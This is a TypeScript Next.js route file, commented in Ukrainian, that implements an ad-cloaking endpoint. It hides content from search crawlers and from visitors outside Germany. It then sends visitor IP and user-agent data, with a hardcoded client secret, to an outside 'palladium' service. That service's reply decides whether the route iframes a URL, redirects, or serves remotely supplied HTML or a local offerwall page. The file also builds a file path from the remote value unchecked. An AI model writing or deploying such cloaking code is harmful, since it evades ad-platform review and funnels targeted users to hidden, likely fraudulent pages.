// /app/api/ads/route.ts (оновлено: точне визначення країни через ipapi)
import { NextRequest } from 'next/server';
import { join } from 'path';
import { promises as fs } from 'fs';

interface PalladiumResponse {
    result: boolean;
    mode?: number;
    target?: string;
    content?: string;
}

type PayloadValue = string | number | boolean | PayloadMap;
interface PayloadMap {
    [key: string]: PayloadValue;
}

function flattenPayload(obj: PayloadMap, prefix = ''): Record<string, string> {
    return Object.entries(obj).reduce((acc, [key, val]) => {
        const newKey = prefix ? `${prefix}[${key}]` : key;
        if (typeof val === 'object' && val !== null && !Array.isArray(val)) {
            Object.assign(acc, flattenPayload(val as PayloadMap, newKey));
        } else {
            acc[newKey] = String(val);
        }
        return acc;
    }, {} as Record<string, string>);
}

export async function GET(req: NextRequest) {
    const ua = req.headers.get('user-agent')?.toLowerCase() || '';
    const isBot = /googlebot|bingbot|yandex|duckduckbot|baiduspider/.test(ua);

    const ipHeader = req.headers.get('x-real-ip') || req.headers.get('x-forwarded-for') || '8.8.8.8';
    const ip = ipHeader.split(',')[0].trim();

    if (isBot) {
        return new Response(null, { status: 204 });
    }

    // Гео-локація через ipapi
    try {
        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
        const geo = await geoRes.json();
        console.log('IP Info:', geo);
        const isGerman = geo.country_code === 'DE';

        if (!isGerman) {
            return new Response(null, { status: 204 });
        }
    } catch {
        return new Response(null, { status: 204 });
    }

    const searchParams = req.nextUrl.searchParams;
    if (searchParams.get('dr_jsess') === '1') {
        return new Response(null, { status: 200 });
    }

    const host = req.headers.get('host') || '';

    const rawPayload: PayloadMap = {
        server: {
            REMOTE_ADDR: ip,
            'User-Agent': ua,
            Host: host,
            HTTP_HOST: host,
            REQUEST_TIME_FLOAT: Date.now() / 1000,
            SERVER_PORT: '443',
            bannerSource: 'adwords',
        },
        auth: {
            clientId: 3024,
            clientCompany: 'CQ21WW9U3ehzwXZOKITe',
            clientSecret:
                'MzAyNENRMjFXVzlVM2VoendYWk9LSVRlY2U2NmY2ZTZmOWRlZjUxMGFjNDBiYTJlNjVjMmFjZGEwMTQyZmZhZQ==',
        },
    };

    const payload = flattenPayload(rawPayload);

    try {
        const palladiumRes = await fetch('https://rbl.palladium.expert', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams(payload),
        });

        const text = await palladiumRes.text();
        let result: PalladiumResponse = { result: false };

        try {
            result = JSON.parse(text);
        } catch {
            return new Response(null, { status: 204 });
        }

        if (result.mode === 3 && result.target) {
            try {
                const filePath = join(process.cwd(), 'public', 'newgermany_oferwall', result.target);
                const file = await fs.readFile(filePath, 'utf8');
                return new Response(file, {
                    status: 200,
                    headers: { 'Content-Type': 'text/html' },
                });
            } catch {
                return new Response('File not found', { status: 404 });
            }
        }

        if (result.result) {
            const { mode, target, content } = result;

            if (mode === 1 && target) {
                return new Response(
                    `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"></head><body><iframe src="${target}" style="width:100%;height:100vh;border:none;"></iframe></body></html>`,
                    { status: 200, headers: { 'Content-Type': 'text/html' } }
                );
            } else if (mode === 2 && target) {
                return Response.redirect(target);
            } else if (mode === 4 && content) {
                return new Response(content, {
                    status: 200,
                    headers: { 'Content-Type': 'text/html' },
                });
            }
        }

        const fallbackPath = join(process.cwd(), 'public', 'newgermany_oferwall', 'index.html');
        try {
            const fallbackHtml = await fs.readFile(fallbackPath, 'utf8');
            return new Response(fallbackHtml, {
                status: 200,
                headers: { 'Content-Type': 'text/html' },
            });
        } catch {
            return new Response('Fallback file not found', { status: 404 });
        }
    } catch {
        return new Response('Internal Server Error', { status: 500 });
    }
}
